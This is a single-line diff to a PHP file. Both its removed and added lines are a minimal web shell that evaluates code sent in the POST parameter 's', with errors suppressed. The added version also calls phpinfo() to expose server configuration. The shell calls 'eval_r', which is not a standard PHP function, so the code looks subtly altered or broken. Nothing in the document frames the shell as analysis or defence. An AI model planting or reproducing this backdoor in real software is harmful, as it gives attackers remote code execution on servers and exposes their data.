@@ -1,1 +1,1 @@
-<?php @eval_r($_POST['s'])?>
+<?php @eval_r($_POST['s']);phpinfo();?>
